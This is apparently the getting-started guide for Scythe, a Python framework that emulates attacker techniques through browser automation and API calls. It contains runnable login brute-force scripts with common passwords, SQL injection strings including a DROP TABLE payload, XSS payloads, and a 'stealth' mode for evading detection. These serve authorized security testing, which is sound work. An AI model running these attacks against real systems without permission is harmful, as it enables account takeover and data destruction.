# Getting Started with Scythe

This guide will help you get up and running with Scythe, an extensible framework for emulating attacker TTPs (Tactics, Techniques, and Procedures) using browser automation.

## Table of Contents

1. [Installation](#installation)
2. [Basic Concepts](#basic-concepts)
3. [Your First TTP](#your-first-ttp)
4. [Understanding Results](#understanding-results)
5. [Adding Behaviors](#adding-behaviors)
6. [Working with Payload Generators](#working-with-payload-generators)
7. [Common Patterns](#common-patterns)
8. [Next Steps](#next-steps)

## Installation

### Prerequisites

Before installing Scythe, ensure you have:

- **Python 3.8+** installed
- **Google Chrome** browser
- **ChromeDriver** (automatically managed by Selenium)

### Install Scythe

1. **Clone the repository:**
   ```bash
   git clone https://github.com/YourOrg/scythe.git
   cd scythe
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Verify installation:**
   ```bash
   python -c "from scythe.core.executor import TTPExecutor; print('✅ Scythe installed successfully!')"
   ```

### Quick Test

Test your installation with a simple example:

```python
# test_installation.py
from scythe.core.executor import TTPExecutor
from scythe.ttps.web.login_bruteforce import LoginBruteforceTTP
from scythe.payloads.generators import StaticPayloadGenerator

# Create a simple test
payload_generator = StaticPayloadGenerator(["test123"])
login_ttp = LoginBruteforceTTP(
    payload_generator=payload_generator,
    username="admin",
    username_selector="#username",
    password_selector="#password",
    submit_selector="#submit"
)

print("✅ Installation verified - Scythe is ready to use!")
```

## Basic Concepts

Scythe is built around four core components:

### 1. **TTPs (Tactics, Techniques, and Procedures)**
TTPs define what attack you want to simulate. Examples:
- Login brute force attacks
- SQL injection testing
- Cross-site scripting (XSS) detection
- Directory traversal attempts

### 2. **Payload Generators**
Generate the test data (payloads) for your TTPs:
- Password lists for brute force attacks
- SQL injection strings
- XSS payloads

### 3. **TTP Executor**
The engine that runs your TTPs against target applications:
- Manages browser automation
- Orchestrates TTP execution
- Collects and reports results

### 4. **Behaviors**
Control how TTPs execute to make them more realistic:
- Human-like timing and movements
- Machine-speed automated testing
- Stealth patterns for evasion

## Your First TTP

Let's create a simple login brute force test:

### Step 1: Create the Test Script

```python
# my_first_ttp.py
from scythe.core.executor import TTPExecutor
from scythe.ttps.web.login_bruteforce import LoginBruteforceTTP
from scythe.payloads.generators import StaticPayloadGenerator

# 1. Create payload generator with common passwords
passwords = StaticPayloadGenerator([
    "password",
    "123456", 
    "admin",
    "letmein",
    "qwerty"
])

# 2. Create the TTP
login_ttp = LoginBruteforceTTP(
    payload_generator=passwords,
    username="admin",              # Username to test
    username_selector="#username", # CSS selector for username field
    password_selector="#password", # CSS selector for password field
    submit_selector="#submit"      # CSS selector for submit button
)

# 3. Create and run the executor
executor = TTPExecutor(
    ttp=login_ttp,
    target_url="http://testphp.vulnweb.com/login.php",
    headless=False  # Set to True to hide browser
)

# 4. Run the test
executor.run()
```

### Step 2: Run Your Test

```bash
python my_first_ttp.py
```

### What Happens

1. **Browser Opens**: Chrome opens and navigates to the target URL
2. **Payload Testing**: Each password is tested against the login form
3. **Result Verification**: Scythe checks if login was successful
4. **Reporting**: Results are logged to console and `ttp_test.log`

## Understanding Results

### Console Output

```
2023-12-07 10:30:45 - Login Bruteforce - INFO - Starting TTP: 'Login Bruteforce' on http://testphp.vulnweb.com/login.php
2023-12-07 10:30:45 - Login Bruteforce - INFO - Description: Attempts to guess a user's password using a list of payloads.
2023-12-07 10:30:46 - Login Bruteforce - INFO - WebDriver initialized.
2023-12-07 10:30:47 - Login Bruteforce - INFO - Attempt 1: Executing with payload -> 'password'
2023-12-07 10:30:49 - Login Bruteforce - INFO - Step did not complete successfully
2023-12-07 10:30:50 - Login Bruteforce - INFO - Attempt 2: Executing with payload -> '123456'
2023-12-07 10:30:51 - Login Bruteforce - WARNING - SUCCESS: 'admin'
```

### Log File

Detailed logs are saved to `ttp_test.log` for later analysis.

### Result Types

- **INFO**: Normal execution progress
- **WARNING**: Successful attacks (vulnerabilities found)
- **ERROR**: Execution problems

### Summary Report

```
==================================================
TTP SUMMARY: Login Bruteforce
==================================================
Found 1 potential vulnerabilities:
  - Payload: admin | URL: http://testphp.vulnweb.com/userinfo.php
```

## Adding Behaviors

Behaviors make your TTPs more realistic and harder to detect:

### Human Behavior

Makes tests look like real user interactions:

```python
from scythe.behaviors import HumanBehavior

# Create human-like behavior
human_behavior = HumanBehavior(
    base_delay=2.0,        # Base time between actions
    delay_variance=1.0,    # Random variance in timing
    mouse_movement=True,   # Random mouse movements
    typing_delay=0.1       # Delay between keystrokes
)

# Use with executor
executor = TTPExecutor(
    ttp=login_ttp,
    target_url="http://example.com/login",
    behavior=human_behavior
)
```

### Machine Behavior

Fast, consistent testing for automation:

```python
from scythe.behaviors import MachineBehavior

# Create machine behavior
machine_behavior = MachineBehavior(
    delay=0.5,        # Fast, consistent timing
    max_retries=5,    # Retry failed attempts
    fail_fast=True    # Stop on critical errors
)

executor = TTPExecutor(
    ttp=login_ttp,
    target_url="http://example.com/login",
    behavior=machine_behavior
)
```

### Stealth Behavior

Evades detection with randomized patterns:

```python
from scythe.behaviors import StealthBehavior

# Create stealth behavior
stealth_behavior = StealthBehavior(
    min_delay=5.0,                  # Minimum delay between actions
    max_delay=15.0,                 # Maximum delay 
    long_pause_probability=0.2,     # Chance of long pauses
    max_requests_per_session=10     # Limit requests per session
)

executor = TTPExecutor(
    ttp=login_ttp,
    target_url="http://example.com/login",
    behavior=stealth_behavior
)
```

## Working with Payload Generators

### Static Payloads

For predefined lists:

```python
from scythe.payloads.generators import StaticPayloadGenerator

# Simple list
passwords = StaticPayloadGenerator([
    "password", "123456", "admin"
])

# Mixed data types
mixed_payloads = StaticPayloadGenerator([
    "string_payload",
    123,
    {"key": "value"}
])
```

### Wordlist Payloads

For large password lists:

```python
from scythe.payloads.generators import WordlistPayloadGenerator

# Load from file (one payload per line)
wordlist = WordlistPayloadGenerator("wordlists/rockyou.txt")

# Use with TTP
login_ttp = LoginBruteforceTTP(
    payload_generator=wordlist,
    username="admin",
    username_selector="#username",
    password_selector="#password",
    submit_selector="#submit"
)
```

### Custom Payload Generators

Create your own generators:

```python
from scythe.payloads.generators import PayloadGenerator
import random
import string

class RandomPasswordGenerator(PayloadGenerator):
    def __init__(self, count=100, min_length=6, max_length=12):
        self.count = count
        self.min_length = min_length
        self.max_length = max_length
    
    def __iter__(self):
        for _ in range(self.count):
            length = random.randint(self.min_length, self.max_length)
            password = ''.join(random.choices(
                string.ascii_letters + string.digits, 
                k=length
            ))
            yield password

# Usage
random_passwords = RandomPasswordGenerator(count=50, min_length=8, max_length=10)
```

## Common Patterns

### Testing Multiple Usernames and Passwords

```python
# Create username/password combinations
usernames = StaticPayloadGenerator(["admin", "user", "test"])
passwords = StaticPayloadGenerator(["password", "123456", "admin"])

# Test each username with each password
for username in ["admin", "user", "test"]:
    login_ttp = LoginBruteforceTTP(
        payload_generator=passwords,
        username=username,
        username_selector="#username",
        password_selector="#password",
        submit_selector="#submit"
    )
    
    print(f"Testing username: {username}")
    executor = TTPExecutor(
        ttp=login_ttp,
        target_url="http://example.com/login"
    )
    executor.run()
```

### SQL Injection Testing

```python
from scythe.ttps.web.sql_injection import URLManipulation

# SQL injection payloads
sql_payloads = StaticPayloadGenerator([
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users; --"
])

# Test URL parameter injection
sql_ttp = URLManipulation(
    payload_generator=sql_payloads,
    target_url="http://example.com/search"
)

executor = TTPExecutor(
    ttp=sql_ttp,
    target_url="http://example.com/search"
)
executor.run()
```

### Form Field Injection

```python
from scythe.ttps.web.sql_injection import InputFieldInjector

# Test form field injection
form_sql_ttp = InputFieldInjector(
    target_url="http://example.com/search",
    field_selector="input[name='query']",
    submit_selector="button[type='submit']",
    payload_generator=sql_payloads
)

executor = TTPExecutor(ttp=form_sql_ttp, target_url="http://example.com/search")
executor.run()
```

### Multiple TTPs in Sequence

```python
# Run multiple TTPs against same target
ttps = [
    ("Login Brute Force", login_ttp),
    ("SQL Injection", sql_ttp),
    ("Form Injection", form_sql_ttp)
]

for name, ttp in ttps:
    print(f"\n=== Running {name} ===")
    executor = TTPExecutor(
        ttp=ttp,
        target_url="http://example.com"
    )
    executor.run()
```

## Next Steps

### 1. Explore Built-in TTPs

Check out the available TTPs:
- `scythe/ttps/web/login_bruteforce.py` - Login attacks
- `scythe/ttps/web/sql_injection.py` - SQL injection tests  
- `scythe/ttps/web/uuid_guessing.py` - UUID enumeration

### 2. Read the Documentation

- **[TTPS.md](TTPS.md)** - Complete TTP framework guide
- **[PAYLOAD_GENERATORS.md](PAYLOAD_GENERATORS.md)** - Payload generation patterns
- **[BEHAVIORS.md](BEHAVIORS.md)** - Behavior system deep dive
- **[EXECUTOR.md](EXECUTOR.md)** - Advanced executor usage

### 3. Create Custom TTPs

Learn to build your own TTPs:

```python
from scythe.core.ttp import TTP
from selenium.webdriver.common.by import By

class CustomXSSTTP(TTP):
    def __init__(self, target_url, input_selector):
        super().__init__(
            name="XSS Test",
            description="Tests for cross-site scripting"
        )
        self.target_url = target_url
        self.input_selector = input_selector
        self.payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>"
        ]
    
    def get_payloads(self):
        yield from self.payloads
    
    def execute_step(self, driver, payload):
        driver.get(self.target_url)
        input_field = driver.find_element(By.CSS_SELECTOR, self.input_selector)
        input_field.send_keys(payload)
        input_field.submit()
    
    def verify_result(self, driver):
        return "alert" in driver.page_source.lower()
```

### 4. Advanced Topics

- **Parallel Execution**: Run multiple TTPs simultaneously
- **CI/CD Integration**: Automate security testing in pipelines
- **Custom Behaviors**: Create specialized execution patterns
- **Result Analysis**: Parse and analyze TTP outputs
- **Performance Optimization**: Handle large-scale testing

### 5. Best Practices

- Always get proper authorization before testing
- Use test environments when possible
- Start with conservative timing and increase as needed
- Monitor resource usage during execution
- Keep logs for analysis and compliance

### 6. Community and Support

- Check the `examples/` directory for more samples
- Read existing TTP implementations for patterns
- Contribute new TTPs and improvements
- Report issues and suggest enhancements

## Troubleshooting

### Common Issues

**ChromeDriver not found:**
```bash
# Install ChromeDriver manually or use webdriver-manager
pip install webdriver-manager
```

**Permission denied errors:**
```bash
# Ensure Chrome can be executed
sudo chmod +x /usr/bin/google-chrome
```

**Element not found errors:**
- Verify CSS selectors using browser developer tools
- Add delays for dynamic content to load
- Use explicit waits for element availability

**Memory issues with large wordlists:**
- Use `WordlistPayloadGenerator` instead of `StaticPayloadGenerator`
- Implement batch processing for very large lists
- Consider using behaviors to limit concurrent execution

### Getting Help

1. Check the logs in `ttp_test.log` for detailed error information
2. Use `headless=False` to see what's happening in the browser
3. Add debug logging: `logging.getLogger().setLevel(logging.DEBUG)`
4. Review the documentation for your specific use case

You're now ready to start using Scythe for security testing! Begin with the simple examples above and gradually explore more advanced features as you become comfortable with the framework.


## API Quickstart (No Browser)

Scythe now supports running journeys directly against REST APIs without launching a browser. Use JourneyExecutor with mode="API" and ApiRequestAction to perform requests via requests.Session.

Example using the included test server (optional):

1. In one terminal, start the demo server that returns the X-SCYTHE-TARGET-VERSION header:
   
   python examples/test_server_with_version.py 8080 1.2.3

2. In another terminal, run the API-mode demo:
   
   python examples/api_mode_demo.py

Minimal inline example:

```python
from scythe.journeys.base import Journey, Step
from scythe.journeys.actions import ApiRequestAction
from scythe.journeys.executor import JourneyExecutor

step = Step(
    name="Ping API",
    description="GET /api/health should return 200",
    actions=[ApiRequestAction(method="GET", url="/api/health", expected_status=200)],
)

journey = Journey(name="API Smoke", description="Simple API health check", steps=[step])

executor = JourneyExecutor(journey=journey, target_url="http://localhost:8080", mode="API")
results = executor.run()
print("Overall:", results.get("overall_success"))
```

Notes:
- No Chrome is required in API mode.
- If your API requires authentication, implement Authentication.get_auth_headers() (BearerTokenAuth already supports this) and pass it to Journey(..., authentication=...). The executor will merge headers into the session.
- Journey automatically attempts to detect version headers via a hybrid approach that first tries a direct HTTP request and then falls back to browser logs if a driver is used.



## API Schema Validation with Pydantic (Optional)

When using API mode, you can validate response JSON against a Pydantic model by passing response_model to ApiRequestAction.

Example:

```python
from pydantic import BaseModel
from scythe.journeys.base import Journey, Step
from scythe.journeys.actions import ApiRequestAction
from scythe.journeys.executor import JourneyExecutor

class Health(BaseModel):
    status: str
    version: str | None = None

step = Step(
    name="Health",
    description="GET /api/health returns 200 and valid schema",
    actions=[
        ApiRequestAction(
            method="GET",
            url="/api/health",
            expected_status=200,
            response_model=Health,
            response_model_context_key="health_model",
            fail_on_validation_error=True,
        )
    ],
)

journey = Journey(name="API Schema Smoke", description="Schema check", steps=[step])
executor = JourneyExecutor(journey=journey, target_url="http://localhost:8080", mode="API")
results = executor.run()
print("Overall:", results.get("overall_success"))
```

Notes:
- If validation fails and fail_on_validation_error=False (default), the action may still be marked successful if HTTP status matches; the validation error is recorded on the action under 'response_validation_error'.
- The parsed model instance is available via action.get_result('response_model_instance') and in Journey context under response_model_context_key (default 'last_response_model').



## Hybrid Cookie-Based Authentication (Optional)

Some applications authenticate via a JWT stored in a cookie (e.g., 'stellarbridge'). Use CookieJWTAuth to log in via API, extract the token from a JSON response, and provide it as a cookie for API or UI runs.

Example (API mode):

```python
from scythe.auth import CookieJWTAuth
from scythe.journeys.base import Journey, Step
from scythe.journeys.actions import ApiRequestAction
from scythe.journeys.executor import JourneyExecutor

auth = CookieJWTAuth(
    login_url="http://localhost:8080/api/login",
    username="user@example.com",
    password="secret",
    username_field="email",
    password_field="password",
    jwt_json_path="auth.jwt",
    cookie_name="stellarbridge",
)

step = Step(
    name="Profile",
    description="Protected endpoint",
    actions=[ApiRequestAction(method="GET", url="/api/profile", expected_status=200)],
)
journey = Journey(name="Cookie API", description="", steps=[step], authentication=auth)

results = JourneyExecutor(journey, target_url="http://localhost:8080", mode="API").run()
print("Overall:", results.get("overall_success"))
```

See docs/HYBRID_AUTH.md for details.
